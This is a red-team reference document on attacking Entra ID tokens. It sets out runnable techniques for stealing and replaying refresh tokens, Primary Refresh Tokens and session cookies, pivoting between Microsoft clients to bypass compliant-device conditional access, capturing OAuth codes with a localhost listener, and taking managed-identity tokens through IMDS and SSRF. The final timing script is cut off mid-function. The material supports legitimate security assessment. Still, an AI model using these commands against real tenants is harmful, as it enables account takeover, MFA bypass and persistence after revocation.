# Entra ID Token Security & Assessment

> **MITRE ATT&CK**: Credential Access > T1528 (Steal Application Access Token), T1550.001 (Application Access Token), T1539 (Steal Web Session Cookie)
> **Platforms**: Azure / Entra ID / Microsoft 365
> **Required Privileges**: Low to Medium
> **OPSEC Risk**: Medium

## Strategic Overview

Every authentication to Microsoft's cloud ecosystem flows through Entra ID tokens. Access tokens
grant entry to resources. Refresh tokens silently renew that access for up to 90 days. Primary
Refresh Tokens provide device-wide SSO. Session cookies keep browser sessions alive. Each token
type has different lifetimes, revocation behaviors, and security controls -- and the gaps between
them are where red team operations thrive. A red team lead must understand that compromising a
single token can cascade across the entire Microsoft ecosystem because Entra ID is the identity
provider for Azure, Microsoft 365, and thousands of federated SaaS applications. The critical
operational insight is that the "Sign Out Everywhere" button and `Revoke-MgUserSignInSession` do
NOT instantly kill all access -- already-issued access tokens survive until expiry, and the actual
revocation timing varies dramatically depending on whether the resource supports Continuous Access
Evaluation (CAE) and whether the client declared CAE capability. This file is the central reference
for token-centric assessment: understanding token internals, measuring revocation timing, and
exploiting the gaps.

---

## Technical Deep-Dive

### 1. JWT Access Token Anatomy

Entra ID access tokens are signed JWTs (JSON Web Tokens) with three Base64URL-encoded parts:
`header.payload.signature`. Understanding the claims is essential for assessing what a token
grants and how it can be abused.

```powershell
# Decode an Entra ID access token (PowerShell)
function Decode-JWT {
    param([string]$Token)
    $parts = $Token.Split('.')
    $header = [System.Text.Encoding]::UTF8.GetString(
        [System.Convert]::FromBase64String($parts[0] + '=' * (4 - $parts[0].Length % 4)))
    $payload = [System.Text.Encoding]::UTF8.GetString(
        [System.Convert]::FromBase64String($parts[1] + '=' * (4 - $parts[1].Length % 4)))
    Write-Output "=== HEADER ===" ; $header | ConvertFrom-Json | ConvertTo-Json -Depth 5
    Write-Output "=== PAYLOAD ===" ; $payload | ConvertFrom-Json | ConvertTo-Json -Depth 5
}

# Usage
Decode-JWT -Token $accessToken

# Python one-liner for quick decode
# python3 -c "import jwt; print(jwt.decode('eyJ...', options={'verify_signature': False}))"
```

```
Key Claims to Assess:
| Claim     | Purpose                          | Red Team Relevance                            |
|-----------|----------------------------------|-----------------------------------------------|
| aud       | Target resource (audience)       | What resource this token grants access to      |
| iss       | Issuer (Entra ID tenant)         | Confirms tenant; v1 vs v2 format differs       |
| tid       | Tenant ID                        | Verify token belongs to target tenant          |
| oid       | Object ID of the principal       | The identity this token represents             |
| sub       | Subject (unique per app+user)    | Different from oid in multi-tenant apps        |
| scp       | Delegated permission scopes      | What the user consented this app to do         |
| roles     | Application permissions          | App-level permissions (no user context)        |
| wids      | Directory role template IDs      | Reveals Global Admin, etc. (well-known GUIDs)  |
| xms_cc    | Client capabilities              | "cp1" = CAE-capable (longer lifetime, revocable)|
| acr       | Authentication context class     | "0" = no MFA, "1" = MFA satisfied              |
| amr       | Authentication methods           | ["pwd","mfa","rsa"] reveals how user authed    |
| exp       | Expiration (Unix timestamp)      | When this token dies -- critical for replay     |
| iat       | Issued at                        | When token was minted                          |
| nbf       | Not before                       | Token validity start time                      |
| appid     | Application (client) ID          | Which app requested this token                  |
| ipaddr    | IP address of requestor          | Some resources validate this; CAE uses it       |
| deviceid  | Entra device ID                  | Present when PRT-based auth was used           |

# Nonce claim quirk: Azure adds a nonce to the JWT header AFTER signing.
# The JWS is signed with SHA256(nonce), then the raw nonce replaces the hash.
# Custom validators must reverse this: replace nonce with SHA256(nonce) to verify.
# Incorrect implementations in custom apps create validation bypass opportunities.
```

```powershell
# v1.0 vs v2.0 endpoint differences (assessment-relevant)
# v1.0: aud = resource URI ("https://graph.microsoft.com")
#        iss = "https://sts.windows.net/{tid}/"
# v2.0: aud = Application ID GUID
#        iss = "https://login.microsoftonline.com/{tid}/v2.0"
#
# Apps accepting both versions may have inconsistent validation.
# Test: request token from v1 endpoint, present to app expecting v2 (or vice versa).

# Well-known wids (directory role) GUIDs:
# 62e90394-69f5-4237-9190-012177145e10 = Global Administrator
# e8611ab8-c189-46e8-94e1-60213ab1f814 = Privileged Role Administrator
# 158c047a-c907-4556-b7ef-446551a6b5f7 = Cloud Application Administrator
# fe930be7-5e62-47db-91af-98c3a49a38b1 = User Administrator
# Look for these in the wids claim to identify high-privilege tokens
```

### 2. Refresh Token Lifecycle & Abuse

Refresh tokens are the most operationally valuable token type. They silently renew access for
up to 90 days, and critically, old refresh tokens are NOT revoked when exchanged for new ones.

```
Token Lifetimes (Current as of 2026):
| Token Type                | Default Lifetime     | Revocation Behavior                       |
|---------------------------|----------------------|-------------------------------------------|
| Access Token (non-CAE)    | 60-90 min (random)   | NOT revocable -- lives until expiry        |
| Access Token (CAE)        | Up to 28 hours       | Revocable near-real-time via CAE events    |
| Refresh Token             | 90 days (rolling)    | Renewed on use; old tokens REMAIN VALID    |
| Primary Refresh Token     | 14 days              | Device-bound, TPM-protected                |
| ESTSAUTH cookie           | Up to 24 hours       | Transient browser session                  |
| ESTSAUTHPERSISTENT cookie | Up to 90 days        | "Stay signed in" / KMSI persistent session |

Critical gap: Password resets and MFA changes do NOT immediately invalidate existing
refresh tokens for non-CAE applications. Only Revoke-MgUserSignInSession (the "Sign Out
Everywhere" button) explicitly invalidates refresh tokens -- and even then, already-issued
access tokens survive until their natural expiry.
```

```powershell
# Obtain tokens using TokenTacticsV2
Import-Module TokenTacticsV2.psd1

# Device code flow -- get initial tokens
$tokens = Get-AzureToken -Client MSGraph
# Returns: access_token, refresh_token, id_token

# Pivot refresh token to different resources (token surfing)
$azureMgmt = RefreshTo-AzureManagement -RefreshToken $tokens.refresh_token
$outlook    = RefreshTo-Outlook -RefreshToken $tokens.refresh_token
$teams      = RefreshTo-Teams -RefreshToken $tokens.refresh_token
$onedrive   = RefreshTo-Substrate -RefreshToken $tokens.refresh_token
$azureCore  = RefreshTo-AzureCoreManagement -RefreshToken $tokens.refresh_token
$dod        = RefreshTo-DODMSGraph -RefreshToken $tokens.refresh_token

# Request CAE-capable tokens (24hr lifetime but subject to revocation)
$caeToken = RefreshTo-MSGraph -RefreshToken $tokens.refresh_token -UseCAE

# Save tokens for later use
$tokens | ConvertTo-Json | Out-File tokens.json
```

```powershell
# EntraTokenAid -- Pure PowerShell token acquisition
Import-Module EntraTokenAid

# Auth Code Flow (opens browser, captures redirect)
$tokens = Get-EntraToken -AuthFlow AuthCode -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Device Code Flow
$tokens = Get-EntraToken -AuthFlow DeviceCode -Resource "https://graph.microsoft.com"

# Tokens are CAE-capable by default (24hr lifetime)
# Auto-decodes JWT claims for immediate inspection
$tokens.DecodedAccessToken

# Feed tokens to other tools
# AzureHound, GraphRunner, etc. accept raw access tokens
```

```powershell
# Refresh token exchange -- manual (useful for understanding the protocol)
$body = @{
    "grant_type"    = "refresh_token"
    "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # MS Office
    "refresh_token" = $refreshToken
    "scope"         = "https://graph.microsoft.com/.default offline_access"
}
$response = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded"

# The response contains BOTH a new access token AND a new refresh token
# CRITICAL: The OLD refresh token often remains valid too
# This means you can stockpile multiple valid refresh tokens as backup
$response.access_token   # New 60-90 min access token
$response.refresh_token  # New 90-day refresh token (old one still works)
```

### 3. FOCI -- Family of Client IDs Token Pivoting

FOCI is a Microsoft mechanism where applications in the same "family" share a single Family
Refresh Token (FRT). A refresh token obtained for ANY family member can be exchanged for
access tokens targeting ANY other family member -- effectively granting the union of all
scopes across the entire family.

```
Key FOCI Client IDs (Offensive Selection from 38+ Known):
| Client ID                              | Application              | Offensive Use                     |
|----------------------------------------|--------------------------|-----------------------------------|
| 04b07795-8ddb-461a-bbee-02f9e1bf7b46   | Azure CLI                | Azure management plane access     |
| 1950a258-227b-4e31-a9cf-717495945fc2   | Azure PowerShell         | Az module equivalent              |
| d3590ed6-52b3-4102-aeff-aad2292ab01c   | Microsoft Office         | Mail, Files, Calendar             |
| 1fec8e78-bce4-4aaf-ab1b-5451cc387264   | Microsoft Teams          | Chat, Teams data                  |
| 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223   | Intune Company Portal    | COMPLIANCE BYPASS (see below)     |
| 4813382a-8fa7-425e-ab75-3b753aab3abb   | Microsoft Authenticator  | Auth method enumeration           |
| 27922004-5251-4030-b22d-91ecd9a37ea4   | Outlook Mobile           | Email access                      |
| e9c51622-460d-4d3d-952d-966a5b1da34c   | Microsoft Edge           | Browser SSO scope                 |
| dd47d17a-3194-4d86-bfd5-c6ae6f5651e3   | Defender for Mobile      | Security telemetry                |
| ab9b8c07-8f02-4f72-87fa-80105867a763   | OneDrive SyncEngine      | File sync access                  |

Full list: github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv
Microsoft refuses to publish the official list because it "changes frequently."
```

```powershell
# FOCI Exploitation Workflow
# 1. Obtain ANY refresh token (device code phish, AiTM, infostealer)
# 2. Exchange via FOCI to access different resources

# Example: Start with Teams token, pivot to Azure management
$teamsToken = Get-AzureToken -Client Teams
$azureToken = RefreshTo-AzureManagement -RefreshToken $teamsToken.refresh_token
# Now you have Azure management access from a Teams refresh token

# Intune Company Portal Compliance Bypass (TokenSmith)
# The Company Portal client ID is exempted from compliance checks because
# Microsoft cannot require compliance BEFORE enrollment.
# Tokens obtained via this client satisfy FOCI and bypass compliant device CA.
# github.com/JumpsecLabs/TokenSmith
TokenSmith.exe --intune-bypass --tenant $tenantId
# Resulting FOCI tokens exchange for Graph API access from non-compliant devices

# Manual FOCI exchange to Intune Company Portal
$body = @{
    "grant_type"    = "refresh_token"
    "client_id"     = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"  # Company Portal
    "refresh_token" = $anyFociRefreshToken
    "scope"         = "https://graph.microsoft.com/.default offline_access"
}
$complianceBypass = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded"
```

### 4. Primary Refresh Token (PRT) Deep-Dive

The PRT is a device-wide SSO credential for Entra ID joined/registered devices. It is stored
in the device's TPM and used to silently authenticate to all Entra-integrated resources. A
stolen PRT grants the same access as sitting at the victim's keyboard.

```powershell
# Check PRT status on target device
dsregcmd /status
# Key indicators:
#   AzureAdJoined: YES
#   AzureAdPrt: YES           <-- PRT is present
#   AzureAdPrtUpdateTime: ... <-- When PRT was last refreshed

# --- Extraction Method 1: Browser DevTools / Remote Debugging (No Malware) ---
# Works on Edge/Chrome. Microsoft considers this "working as intended."
# 1. Enable remote debugging
msedge.exe --remote-debugging-port=9222
# Or: chrome.exe --remote-debugging-port=9222

# 2. Navigate to any Entra-authenticated service
# 3. Open DevTools > Network tab
# 4. Look for 302 redirect to login.microsoftonline.com
# 5. Capture the x-ms-RefreshTokenCredential header value
# 6. This JWT contains the PRT-derived token with "is_primary": "true"

# Replay: Set as cookie named x-ms-RefreshTokenCredential at login.microsoftonline.com
# The sso_nonce has a 5-MINUTE lifetime -- tight but exploitable window

# --- Extraction Method 2: Mimikatz (Requires SYSTEM/Debug) ---
mimikatz# privilege::debug
mimikatz# sekurlsa::cloudap
# Extracts: ProofOfPossessionCookie, KeyValue (session key)
# Session key is decrypted in LSASS memory even when TPM-protected

# --- Extraction Method 3: ROADtoken ---
ROADtoken.exe
# Outputs PRT cookie directly, ready for browser injection

# --- Extraction Method 4: RequestAADRefreshToken ---
RequestAADRefreshToken.exe
# Modified forks support arbitrary URLs and nonce handling

# --- Extraction Method 5: ROADtools (roadtx) ---
# Register a device, request PRT, inject into browser
roadtx device -n "AssessmentDevice"
roadtx prt -u user@target.com -p password
roadtx browserprtauth --prt $prtToken --prt-sessionkey $sessionKey
# Emulates Windows Web Account Manager (WAM) for SSO
```

```powershell
# PRT Phishing (dirkjanm technique)
# 1. Obtain initial tokens via device code phishing
# 2. Use tokens to register a NEW device in Entra ID
roadtx device -a  # Register device using access token
# 3. Request a PRT for the new device
roadtx prt -rt $refreshToken --device-key device.pem --device-cert device.crt
# 4. Optionally deploy passwordless credentials (WHfB keys)
# These comply with strict MFA policies because the PRT satisfies device claims

# Pass-the-PRT
# Inject PRT cookie into browser via developer tools or Cookie-Editor extension
# Cookie name: x-ms-RefreshTokenCredential
# Cookie domain: login.microsoftonline.com
# Once set, navigate to any Entra-protected resource -- SSO is automatic
```

### 5. Session Tokens & Cookie Theft

Browser session cookies are the most commonly stolen credential in the real world. In H1 2025,
1.8 billion credentials were harvested by infostealers, with 39% of breaches involving stolen
session cookies. Token Protection does NOT protect browser cookies.

```
Entra ID Session Cookies:
| Cookie Name            | Lifetime    | Purpose                          | Theft Impact           |
|------------------------|-------------|----------------------------------|------------------------|
| ESTSAUTH               | 24 hours    | Transient session cookie         | Short-term session     |
| ESTSAUTHPERSISTENT     | Up to 90 days| "Stay signed in" (KMSI) cookie  | Long-term MFA bypass   |
| x-ms-RefreshTokenCredential | Session | PRT-derived SSO cookie          | Full device SSO        |
```

```
# Cookie-Bite Attack (Varonis, 2025)
# Malicious Chrome extension monitors login.microsoftonline.com
# Captures ESTSAUTH and ESTSAUTHPERSISTENT on every auth event
# Exfiltrates to attacker-controlled endpoint (Google Form, webhook, etc.)

# Attack chain:
# 1. Deploy Chrome extension (via social engineering, GPO, or Intune push)
# 2. Extension hooks browser cookie API for login.microsoftonline.com
# 3. On auth event, extension captures session cookies
# 4. Cookies exfiltrated via HTTPS POST to attacker endpoint
# 5. Attacker imports cookies (Cookie-Editor extension or Python requests)
# 6. Full authenticated session -- MFA already satisfied

# Persistence: PowerShell + Task Scheduler re-injects extension on every
# Chrome launch in Developer Mode

# Evilginx3 AiTM (Still Fully Effective in 2026)
# Standard MFA (TOTP, push, SMS) does not protect against AiTM
# Evilginx captures session cookies in transit during the legitimate auth flow
# Community-maintained phishlets for M365/Entra ID
# Token Protection does NOT apply to standard browser sessions

# FIDO2/Passkey Downgrade Attack:
# Custom phishlets spoof a Safari-on-Windows User-Agent
# Entra ID considers FIDO2 incompatible with this combo
# Forces fallback to vulnerable auth methods (TOTP, push, SMS)
# If fallback methods are enabled, passkey protection is bypassable

# TokenFlare -- Serverless AiTM (JUMPSEC, 2025)
# ~530 lines of JavaScript on Cloudflare Workers
# Deploys in under 60 seconds via CLI wizard
# Captures: ESTSAUTH, ESTSAUTHPERSISTENT, credentials
# Custom User-Agent headers to satisfy platform-specific CA policies
# Built-in bot blocking, AS organization filtering
# Exfil via webhook to Slack/Discord/Teams
# github.com/JumpsecLabs/TokenFlare
```

```powershell
# Pass-the-Cookie replay (after obtaining session cookies)
# Option 1: Browser extension (Cookie-Editor)
# 1. Open browser, navigate to login.microsoftonline.com
# 2. Open Cookie-Editor, import ESTSAUTH/ESTSAUTHPERSISTENT cookies
# 3. Navigate to portal.azure.com or office.com -- authenticated

# Option 2: Python requests (see Section 9 for full script)
import requests
session = requests.Session()
session.cookies.set("ESTSAUTH", stolen_cookie, domain=".login.microsoftonline.com")
session.cookies.set("ESTSAUTHPERSISTENT", stolen_persistent, domain=".login.microsoftonline.com")
r = session.get("https://graph.microsoft.com/v1.0/me",
    headers={"Authorization": f"Bearer {access_token}"})
```

### 6. Desktop Application IPC Token Theft

Desktop applications like Slack, 1Password, Microsoft Teams, and browser-based OAuth clients
use Inter-Process Communication (IPC) to exchange tokens between the application and the
system's token broker (WAM on Windows). If an attacker can influence the IPC channel or
redirect OAuth callbacks, tokens can be intercepted without touching LSASS or the TPM.

```
# --- Attack Surface: OAuth Redirect URI Manipulation ---

# Many desktop apps use localhost redirect URIs for OAuth flows:
#   http://localhost:PORT/callback
#   http://127.0.0.1:PORT/callback
# If the port is predictable or the app doesn't validate the redirect,
# an attacker can bind to the port first and capture the auth code.

# Scenario: Slack desktop OAuth flow
# 1. Slack opens browser for OAuth to Entra ID
# 2. Redirect URI: http://localhost:XXXXX/callback?code=AUTH_CODE
# 3. If attacker binds to that port before Slack, they capture the auth code
# 4. Exchange auth code for access + refresh tokens

# Python listener for localhost redirect interception:
import http.server
import urllib.parse

class TokenCapture(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if "code" in params:
            print(f"[+] Captured auth code: {params['code'][0]}")
            # Exchange code for tokens immediately
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Authentication complete.")

# Listen on common localhost redirect ports
# Some apps use random ports -- monitor with netstat during auth flows
server = http.server.HTTPServer(("127.0.0.1", 8400), TokenCapture)
server.serve_forever()
```

```
# --- Attack Surface: Windows Web Account Manager (WAM) ---

# WAM is the system-level token broker on Windows 10+
# Applications request tokens via WAM IPC, not directly from Entra ID
# WAM stores tokens encrypted in the Token Broker cache

# Token Broker cache location:
# %LOCALAPPDATA%\Microsoft\TokenBroker\Cache\
# Files: *.tbres (encrypted token broker response files)

# The TokenBroker process runs as the logged-in user
# If you have user-level access, you can:
# 1. Dump WAM token cache from memory (roadtx wamtoken)
# 2. Register a fake app that requests tokens via WAM
# 3. Intercept IPC between the app and WAM

# roadtx WAM emulation:
roadtx wamtoken --prt-cookie $prtCookie
# Emulates a WAM token request using a stolen PRT
# Returns access tokens for any resource WAM can access

# 1Password, Slack, and similar apps may store OAuth tokens in:
# - OS keychain (Windows Credential Manager / macOS Keychain)
# - Application-specific SQLite databases
# - Encrypted local storage (Electron apps: LevelDB in app data)
# These are accessible with user-level privileges

# Electron app token extraction (Slack, Teams, VS Code, etc.):
# %APPDATA%\<AppName>\Local Storage\leveldb\
# Look for: *.log and *.ldb files containing "access_token" or "refresh_token"
# Electron apps use Chrome's storage engine -- same extraction as browser cookies
```

```
# --- Attack Surface: Custom URI Scheme Hijacking ---

# Some apps register custom URI schemes for OAuth callbacks:
#   msauth://callback, slack://oauth, onepassword://...
# On Windows, URI schemes are registered in the registry:
# HKCU\Software\Classes\<scheme>\shell\open\command

# Attack: Register a malicious handler for the scheme BEFORE the target app
# When OAuth redirects to the custom URI, your handler captures the auth code

# Check registered URI schemes:
reg query "HKCU\Software\Classes" /s /f "URL Protocol" 2>nul | findstr /i "msauth slack"

# This attack requires local access but no admin privileges
# Custom URI schemes are a known weak point in OAuth for desktop apps
```

```
# --- MFASweep: Service-Level MFA Enforcement Testing ---
# github.com/dafthack/MFASweep

# Tests which Microsoft services enforce MFA and which are single-factor
# This identifies services where stolen passwords alone grant token access

Import-Module MFASweep.ps1

# Test all common endpoints for MFA enforcement
Invoke-MFASweep -Username user@target.com -Password "Password123"

# Checks: Azure Portal, Graph API, Exchange Online, SharePoint,
#          Azure Management, Outlook Web, Azure AD Connect, etc.
# Output: "MFA Required" vs "Single Factor" per service
# Any "Single Factor" result = token obtainable with password alone

# Red team use: After obtaining credentials (spray, phish, dump),
# run MFASweep to find which resources you can access WITHOUT MFA
# Then obtain tokens for those resources directly
```

### 7. Managed Identity Tokens

Azure Managed Identity tokens are obtained from the Instance Metadata Service (IMDS) at
`169.254.169.254`. These tokens are not bound to a user -- they represent the Azure resource
itself and often have broad permissions.

```bash
# Token request from an Azure VM with Managed Identity attached
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | python3 -m json.tool

# Response includes access_token, expires_on, resource
# Tokens can be REPLAYED from outside Azure -- no device binding

# App Service / Azure Functions token endpoint
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"

# SSRF-to-IMDS: The classic cloud attack vector
# If a web app has an SSRF vulnerability, request:
# http://169.254.169.254/metadata/identity/oauth2/token?...
# The Metadata: true header is required but easily added via SSRF
# Stolen token works from any IP -- no source validation

# Metadata Security Protocol (MSP) -- GA November 2025
# Azure's answer to IMDS abuse:
# - Default-closed model: IMDS requires authenticated access
# - Guest Proxy Agent (GPA) uses eBPF to verify process identity
# - Eliminates SSRF-to-IMDS attack vector on MSP-enabled VMs
# - Latest API version: 2025-04-07
#
# Assessment: Check if MSP is enabled on target resources
# Pre-MSP VMs remain vulnerable to traditional IMDS token theft
# MSP adoption is opt-in and gradual -- many orgs have NOT enabled it
# No public MSP bypasses as of Feb 2026, but root/SYSTEM could
# theoretically interfere with the GPA process itself
```

### 8. Token Protection & Defensive Controls

Understanding Entra ID's token defenses is essential for knowing which tokens can be
replayed, which have extended lifetimes, and where the gaps are.

```
Token Protection (Conditional Access Session Control):
Cryptographically binds sign-in session tokens to the device using TPM-backed keys.
A stolen token cannot be used on a different device.

CURRENT LIMITATIONS (exploitable gaps):
| Gap                     | Detail                                                    |
|-------------------------|-----------------------------------------------------------|
| Platform coverage       | ONLY Windows 10+, Entra joined/hybrid/registered          |
|                         | Does NOT cover: macOS, iOS, Android, Linux, web browsers   |
| Application coverage    | ONLY Exchange Online, SharePoint Online, Teams             |
|                         | Graph API, Azure Management, and all other resources: UNBOUND |
| User-Agent spoofing     | CA identifies platforms via User-Agent string               |
|                         | Spoof non-Windows UA (e.g., Safari/iOS) to bypass entirely  |
|                         | If no default-deny for unknown platforms, trivially exploitable |
| Browser cookies         | Token Protection does NOT protect ESTSAUTH cookies          |
|                         | Session cookies remain stealable and replayable             |
| FOCI bypass             | Intune Company Portal (FOCI) tokens are exempt from compliance |
|                         | TokenSmith exploits this for compliant device CA bypass     |
```

```
Continuous Access Evaluation (CAE):
CAE-capable clients include xms_cc: "cp1" in token requests.
CAE tokens have 28-hour lifetimes but can be revoked near-real-time.

BYPASS TECHNIQUES:
| Technique                | Mechanism                                                  |
|--------------------------|------------------------------------------------------------|
| Non-CAE client fallback  | Use a client that does NOT declare cp1 capability           |
|                          | Gets standard 60-90 min token IMMUNE to real-time revocation|
| IP mismatch exploitation | Split tunneling, IPv4/v6 mismatch between RP and Entra ID  |
|                          | Strict location enforcement fails on IP disagreement        |
| Non-Microsoft resources  | Third-party apps: CAE does NOT enforce IP-based location    |
|                          | Only MS resources (Exchange, SharePoint, Teams, Graph)      |
| Universal CAE gap        | Requires Global Secure Access deployment (most orgs lack it)|

# Practical: Request non-CAE token intentionally
# Omit the "cp1" client capability claim
# The resulting token has shorter lifetime (60-90 min) but CANNOT be revoked
# Tradeoff: shorter window vs. immunity to real-time revocation

# Practical: Request CAE token intentionally
# TokenTacticsV2: -UseCAE parameter
$longToken = RefreshTo-MSGraph -RefreshToken $rt -UseCAE
# 24-hour token, but subject to revocation if SOC responds quickly
```

### 9. Intercepting Token Flows with Burp Suite

Burp Suite is essential for inspecting and manipulating Entra ID token flows during
assessments. You can observe the complete OAuth2 exchange, decode JWTs in transit,
and test token replay by intercepting browser-to-Entra traffic.

```
# --- Burp Suite Setup for Entra ID Traffic ---

# Step 1: Configure browser to proxy through Burp (127.0.0.1:8080)
# Install Burp CA certificate in browser/system trust store
# Target domains to intercept:
#   login.microsoftonline.com    (authentication)
#   login.microsoft.com          (authentication)
#   graph.microsoft.com          (API calls)
#   management.azure.com         (Azure management)
#   *.sharepoint.com             (SharePoint/OneDrive)

# Step 2: Scope configuration (Target > Scope)
# Add to scope:
#   .*\.microsoftonline\.com
#   .*\.microsoft\.com
#   .*\.azure\.com
#   .*\.sharepoint\.com
# This filters noise and focuses on auth-relevant traffic

# Step 3: Key requests to watch for in Proxy > HTTP History

# OAuth2 Authorization Code Flow:
# 1. GET /authorize?client_id=...&redirect_uri=...&scope=...&response_type=code
#    -> Initial auth request. Note the client_id and scope.
# 2. POST /oauth2/v2.0/token
#    Body: grant_type=authorization_code&code=AUTH_CODE&redirect_uri=...
#    -> Token exchange. Response contains access_token, refresh_token, id_token.
# 3. Subsequent API calls with Authorization: Bearer eyJ...
#    -> Decode the JWT in Burp (Extensions > JSON Web Tokens / JWT Editor)

# Device Code Flow:
# 1. POST /oauth2/devicecode
#    Body: client_id=...&resource=...
#    Response: device_code, user_code, verification_uri
# 2. POST /oauth2/token  (polling)
#    Body: grant_type=urn:ietf:params:oauth:grant-type:device_code&code=DEVICE_CODE
#    Response (on auth): access_token, refresh_token

# PRT-based SSO:
# Watch for x-ms-RefreshTokenCredential cookie in redirects
# This is the PRT-derived JWT with is_primary: true

# Refresh Token Exchange:
# POST /oauth2/v2.0/token
# Body: grant_type=refresh_token&refresh_token=REFRESH_TOKEN&client_id=...
# Note: both old AND new refresh tokens may remain valid
```

```
# --- Burp Extensions for Token Assessment ---

# JWT Editor (PortSwigger) -- built into Burp Pro
# Automatically detects and decodes JWTs in requests/responses
# Allows claim modification and re-signing (with key material)
# Test: modify aud, scp, roles claims and observe server behavior

# JSON Web Tokens (free BApp)
# Adds JWT tab to request/response inspectors
# Decodes header, payload, and verifies signature status

# InQL (GraphQL introspection)
# If target uses Microsoft Graph via GraphQL wrapper
# Enumerate available queries and mutations

# Autorize
# Replay requests with different tokens to test authorization
# Swap high-privilege token for low-privilege: does API still respond?

# Practical workflow:
# 1. Authenticate normally via browser (proxied through Burp)
# 2. Identify the refresh token exchange in HTTP History
# 3. Send the token request to Repeater
# 4. Modify client_id to a FOCI family member
# 5. Observe whether you receive tokens with different scopes
# 6. Test scope escalation by requesting additional scopes
```

```
# --- Burp Macros for Automated Token Refresh ---

# Problem: Access tokens expire during long testing sessions
# Solution: Configure a Burp macro to auto-refresh tokens

# Project Options > Sessions > Macros > Add
# 1. Record a refresh token exchange (POST /oauth2/v2.0/token)
# 2. Define a custom parameter: access_token from response JSON
# 3. Session Handling Rules > Add
#    Scope: Target domains (graph.microsoft.com, etc.)
#    Action: Run macro, update Authorization header with Bearer {access_token}
# 4. Now Burp automatically refreshes expired tokens during scanning/testing

# Alternative: Use Burp's Match & Replace
# Match: Authorization: Bearer OLD_TOKEN
# Replace: Authorization: Bearer NEW_TOKEN
# Quick swap when testing different privilege levels
```

### 10. Python Token Revocation Timing Assessment

This script continuously tests access tokens and refresh tokens against Microsoft Graph API
to measure the actual time between a "Sign Out Everywhere" action and when tokens stop
working. This directly tests CAE enforcement and refresh token revocation timing.

```python
#!/usr/bin/env python3
"""
entra_revocation_timer.py - Measure Entra ID Token Revocation Timing

Tests how long access tokens and refresh tokens remain valid after
the IR team clicks "Sign Out Everywhere" (Revoke-MgUserSignInSession).

Usage:
    python3 entra_revocation_timer.py --access-token "eyJ..." --refresh-token "eyJ..."
    python3 entra_revocation_timer.py --token-file tokens.json
    python3 entra_revocation_timer.py --access-token "eyJ..." --refresh-token "eyJ..." --interval 10

Procedure:
    1. Obtain tokens (device code flow, AiTM, TokenTacticsV2, etc.)
    2. Start this script with the tokens
    3. Signal the IR team / blue team to click "Sign Out Everywhere"
    4. Record the exact time they click (--revoke-time "2026-02-25T14:30:00")
    5. Script logs when each token type stops working
    6. Delta = actual revocation delay

Author: Red Team Assessment Tool
"""

import argparse
import json
import time
import sys
import os
from datetime import datetime, timezone

# Use requests if available, fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    import urllib.parse
    HAS_REQUESTS = False
    print("[!] 'requests' not installed. Using urllib. Install with: pip install requests")


GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me"
TOKEN_URL_TEMPLATE = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
DEFAULT_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office (FOCI)
DEFAULT_TENANT = "common"
LOG_FILE = "revocation_timing_{}.log"


def log(msg, log_fh=None):
    """Print and optionally log a timestamped message."""
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    line = f"[{ts}] {msg}"
    print(line)
    if log_fh:
        log_fh.write(line + "\n")
        log_fh.flush()


def decode_jwt_claims(token):
    """Decode JWT payload without verification (assessment only)."""
    import base64
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        payload = parts[1]
        # Fix padding
        payload += "=" * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return {}


def test_access_token(access_token):
    """Test if an access token is still valid against Microsoft Graph /me."""
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        if HAS_REQUESTS:
            r = requests.get(GRAPH_ME_URL, headers=headers, timeout=10)
            return r.status_code, r.text[:200]
        else:
            req = urllib.request.Request(GRAPH_ME_URL, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status, resp.read(200).decode()
    except Exception as e:
        error_str = str(e)
        # Extract HTTP status from urllib errors
        if hasattr(e, "code"):
            return e.code, error_str[:200]
        return 0, error_str[:200]


def test_refresh_token(refresh_token, client_id=DEFAULT_CLIENT_ID, tenant=DEFAULT_TENANT):
    """Test if a refresh token can still be exchanged for new tokens."""
    url = TOKEN_URL_TEMPLATE.format(tenant=tenant)
    data = {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "refresh_token": refresh_token,
        "scope": "https://graph.microsoft.com/.default offline_access",
    }
    try:
        if HAS_REQUESTS:
            r = requests.post(url, data=data, timeout=10)
            if r.status_code == 200:
                resp_json = r.json()
                new_access = resp_json.get("access_token", "")
                new_refresh = resp_json.get("refresh_token", "")
                return True, new_access, new_refresh
            else:
                return False, "", r.text[:200]
        else:
            encoded = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(url, data=encoded,
                headers={"Content-Type": "application/x-www-form-urlencoded"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                resp_json = json.loads(resp.read())
                return True, resp_json.get("access_token", ""), resp_json.get("refresh_token", "")
    except Exception as e:
        return False, "", str(e)[:200]


def run_assessment(access_token, refresh_token, interval, client_id, tenant,
                   revoke_time_str, log_fh):
    """Main assessment loop."""
